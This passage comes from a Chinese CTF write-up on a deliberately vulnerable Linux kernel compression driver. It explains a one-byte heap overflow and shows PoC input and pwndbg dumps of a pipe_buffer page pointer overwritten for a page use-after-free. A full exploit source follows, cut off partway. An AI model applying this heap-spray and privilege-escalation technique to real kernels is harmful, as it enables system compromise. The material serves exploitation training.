write_bit_to_result(<span class="number">1</span>, &amp;ptr, &amp;idx, &amp;bits); <span class="comment">// Stop bit</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                write_bit_to_result(<span class="number">0</span>, &amp;ptr, &amp;idx, &amp;bits);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *out_size = bits / <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">decompress</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *input, <span class="type">unsigned</span> <span class="type">long</span> size, <span class="type">int</span> **output, <span class="type">unsigned</span> <span class="type">long</span> *out_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Worst case: each byte has a stop bit, means each byte will become an int</span></span><br><span class="line">    *out_size = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> *res = kmalloc(size * <span class="number">4</span>, GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = size - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> curr_byte = input[i];</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> is_stop = curr_byte &amp; <span class="number">0b10000000</span>;</span><br><span class="line">        <span class="type">int</span> value = curr_byte &amp; <span class="number">0b01111111</span>;</span><br><span class="line"></span><br><span class="line">        sum = (sum &lt;&lt; offset) | value;</span><br><span class="line">        offset += <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_stop)</span><br><span class="line">        &#123;</span><br><span class="line">            offset = <span class="number">0</span>;</span><br><span class="line">            res[(*out_size)++] = sum;</span><br><span class="line">            sum = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *output = kmalloc(*out_size * <span class="number">4</span>, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; *out_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        (*output)[i] = res[*out_size - i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    kfree(res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Initialisation function.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">vuln_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">    mutex_init(&amp;g_mutex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create the device */</span></span><br><span class="line">    err = misc_register(&amp;g_device);</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;safe_compression: Failed to misc_register\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;safe_compression: module initialized\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Cleanup function.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">vuln_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// int i;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// for (i = 0; i &lt; VULN_MAX_CHANNELS; i++)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     vuln_destroy_channel(i);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    misc_deregister(&amp;g_device);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;vuln: module exited\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(vuln_init);</span><br><span class="line">module_exit(vuln_exit);</span><br></pre></td></tr></table></figure><h2 id="漏洞分析与利用"><a href="#漏洞分析与利用" class="headerlink" title="漏洞分析与利用"></a>漏洞分析与利用</h2><p>这个内核驱动实现了一个自定义的数据压缩与解压，一共有四个功能，总结如下：<br>compress：根据用户输入的数据的大小分配相应大小的堆块，用自定义的压缩算法降数据压缩后写入到申请的堆块中，最多可以申请 200 个堆块<br>decompress：选中其中一个堆块并将其内容进行解压返回给用户<br>delete：释放指定的堆块，这里在调用 kfree 后讲指针清空了，不存在 UAF<br>empty：将当前堆块清空  </p><p>这里用脚都能想到漏洞肯定出现在这个压缩算法上，该加密算法的写的挺抽象的，其大致流程如下：<br>将每个 32 bit 的 int 对象按 7 bit 进行分组，然后在每组的最高位加上一个 bit 变成一字节的数据写入到堆内存中。如果当前组是当前 32 bit 的 int 对象的第一组，则最高位的 bit 为 1，其他情况下都为 0。如果当前分组的值为 0 且不为 int 对象的第一个组，则直接停止对该 int 对象的压缩，开始处理下一个 int 对象。如果当前分组的值为 0 且为 int 的对象的第一个组，则写入这第一个分组（当然最高位依然要补 1）然后直接进行下一个 int 的压缩</p><p>这里为了方便理解，直接举个例子:  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data[<span class="number">0</span>] = <span class="number">0x11111111</span>;</span><br><span class="line">compress(<span class="number">0</span>,data,<span class="number">16</span>);</span><br></pre></td></tr></table></figure><p>第三个参数 16 是 size，也就是告诉内核我要对 16 个 int 对象进行压缩，也就是说内核会在堆上申请 4 * 16 &#x3D; 0x40 大小的堆空间，此时压缩后的数据如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">8</span>gx <span class="number">0xffffa1bdc1319940</span></span><br><span class="line"><span class="number">0xffffa1bdc1319940</span>:     <span class="number">0x8080800108442291</span>      <span class="number">0x8080808080808080</span></span><br><span class="line"><span class="number">0xffffa1bdc1319950</span>:     <span class="number">0x0000000080808080</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffffa1bdc1319960</span>:     <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffffa1bdc1319970</span>:     <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>可以看到压缩后的数据为 0x108442291 和 15 个 0x80，0x80 的二进制为：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bin</span>(<span class="number">0x80</span>)</span><br><span class="line"><span class="string">&#x27;0b10000000&#x27;</span></span><br></pre></td></tr></table></figure><p>在我们的压缩算法里面要出现这种现象的只有一种情况，那就是这个 int 对象全为 0，而我们告诉内核我们要压缩 15 个 int 对象，我们输入数据里面有 15 个 int 为 0，和 15 个 0x80 相吻合。  </p><p>而 0x108442291 则为 0x11111111 压缩后的结果，将其二进制位进行比较然后在看一遍我上面对该压缩算法的简述就很好理解：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bin</span>(<span class="number">0x11111111</span>)</span><br><span class="line"><span class="string">&#x27;0b10001000100010001000100010001&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bin</span>(<span class="number">0x0108442291</span>)</span><br><span class="line"><span class="string">&#x27;0b100001000010001000010001010010001&#x27;</span></span><br></pre></td></tr></table></figure><p>看到这里漏洞就显而易见了，该压缩算法主要是对 0 数据进行压缩，可是如果我们一个 int 类型的数据长度刚好占满了 4 字节呢？由于每一组都会有 1 bit 的标志位，因此这里会溢出一字节。上面 0x11111111 压缩后的数据就明显比压缩前的数据大。由于 int 为 0 的时压缩后的数据为 0x80，0x40 对齐，刚好可以用于覆盖 pipe_buffer 的低字节来实现 page uaf  </p><p>下面这段 poc 可以实现 0x40 大小的 object 溢出一字节 \x80  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">data[<span class="number">0</span>] = <span class="number">0x11111111</span>;</span><br><span class="line">data[<span class="number">1</span>] = <span class="number">0x22222222</span>;</span><br><span class="line">data[<span class="number">2</span>] = <span class="number">0x33333333</span>;</span><br><span class="line">data[<span class="number">3</span>] = <span class="number">0x44444444</span>;</span><br><span class="line">data[<span class="number">4</span>] = <span class="number">0x55555555</span>;</span><br><span class="line">data[<span class="number">5</span>] = <span class="number">0x66666666</span>;</span><br><span class="line">data[<span class="number">6</span>] = <span class="number">0x77777777</span>;</span><br><span class="line">data[<span class="number">7</span>] = <span class="number">0x88888888</span>;</span><br><span class="line">data[<span class="number">8</span>] = <span class="number">0x99999999</span>;</span><br><span class="line">data[<span class="number">9</span>] = <span class="number">0xaaaaaaaa</span>;</span><br><span class="line">data[<span class="number">10</span>] = <span class="number">0xbbbbbbbb</span>;</span><br><span class="line">data[<span class="number">11</span>] = <span class="number">0xcccccccc</span>;</span><br><span class="line">data[<span class="number">12</span>] = <span class="number">0xc0</span>;</span><br><span class="line"></span><br><span class="line">compress(<span class="number">0</span>,data,<span class="number">16</span>);</span><br></pre></td></tr></table></figure><p>这里我们 object 申请用的是 GFP_KERNEL，而 pipe_buffer 用的是 GFP_KERNEL_ACCOUNT，存在隔离，可是在调试的过程中我们会发现有很大概率存在一个 kmalloc-64 且类型为 GFP_KERNEL 的 slab 与一个空闲的 page 相邻，所以我们可以堆喷大量的 pipe_buffer 尝试占用那一个 page，然后再堆喷大量的溢出压缩 object 尝试覆盖 pipe_buffer 的 page 指针的低字节，构造出 page uaf，效果如下：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tel 0xffff8e89013a1000-0x40</span><br><span class="line">00:0000│  0xffff8e89013a0fc0 ◂— 0x844a20108442291</span><br><span class="line">01:0008│  0xffff8e89013a0fc8 ◂— 0xc403194c66b30211</span><br><span class="line">02:0010│  0xffff8e89013a0fd0 ◂— 0x2a552ad504221108</span><br><span class="line">03:0018│  0xffff8e89013a0fd8 ◂— 0x6ef70633194ce605</span><br><span class="line">04:0020│  0xffff8e89013a0fe0 ◂— 0x7844221188073b5d</span><br><span class="line">05:0028│  0xffff8e89013a0fe8 ◂— 0x2a55aa794c663399</span><br><span class="line">06:0030│  0xffff8e89013a0ff0 ◂— 0xcc7b5d6e77bb7a55</span><br><span class="line">07:0038│  0xffff8e89013a0ff8 ◂— 0x808001c07c663319</span><br><span class="line">pwndbg&gt;</span><br><span class="line">08:0040│  0xffff8e89013a1000 —▸ 0xffff8e89013a0780 ◂— 0x844a20108442291  ----&gt; victim</span><br><span class="line">09:0048│  0xffff8e89013a1008 ◂— 0x3b /* <span class="string">&#x27;;&#x27;</span> */</span><br><span class="line">0a:0050│  0xffff8e89013a1010 ◂— 0x41 /* <span class="string">&#x27;A&#x27;</span> */</span><br><span class="line">0b:0058│  0xffff8e89013a1018 ◂— 0x0</span><br><span class="line">0c:0060│  0xffff8e89013a1020 —▸ 0xffff8e89013a0740 ◂— 0x844a20108442291</span><br><span class="line">0d:0068│  0xffff8e89013a1028 ◂— 0x3c /* <span class="string">&#x27;&lt;&#x27;</span> */</span><br><span class="line">0e:0070│  0xffff8e89013a1030 ◂— 0x41 /* <span class="string">&#x27;A&#x27;</span> */</span><br><span class="line">0f:0078│  0xffff8e89013a1038 ◂— 0x0</span><br><span class="line">pwndbg&gt;</span><br><span class="line">10:0080│  0xffff8e89013a1040 —▸ 0xffff8e89013a0780 ◂— 0x844a20108442291  ----&gt; victim</span><br><span class="line">11:0088│  0xffff8e89013a1048 ◂— 0x3d /* <span class="string">&#x27;=&#x27;</span> */</span><br><span class="line">12:0090│  0xffff8e89013a1050 ◂— 0x41 /* <span class="string">&#x27;A&#x27;</span> */</span><br><span class="line">13:0098│  0xffff8e89013a1058 ◂— 0x0</span><br><span class="line">14:00a0│  0xffff8e89013a1060 —▸ 0xffff8e89013a07c0 ◂— 0x844a20108442291</span><br><span class="line">15:00a8│  0xffff8e89013a1068 ◂— 0x3e /* <span class="string">&#x27;&gt;&#x27;</span> */</span><br><span class="line">16:00b0│  0xffff8e89013a1070 ◂— 0x41 /* <span class="string">&#x27;A&#x27;</span> */</span><br><span class="line">17:00b8│  0xffff8e89013a1078 ◂— 0x0</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compress_array_arg</span>&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx;</span><br><span class="line">    <span class="type">int</span> *<span class="built_in">array</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">decompress_array_arg</span>&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx;</span><br><span class="line">    <span class="type">int</span> *<span class="built_in">array</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">del_array_arg</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">empty_array_arg</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PIPE_COUNT 0x80</span></span><br><span class="line"><span class="type">int</span> pipe_fd[MAX_PIPE_COUNT][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> already_read[MAX_PIPE_COUNT];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipes</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> cnt)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter %s start from index: %d\n&quot;</span>, __PRETTY_FUNCTION__, start);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt; cnt; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;resize pipe&quot;</span>);    </span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + 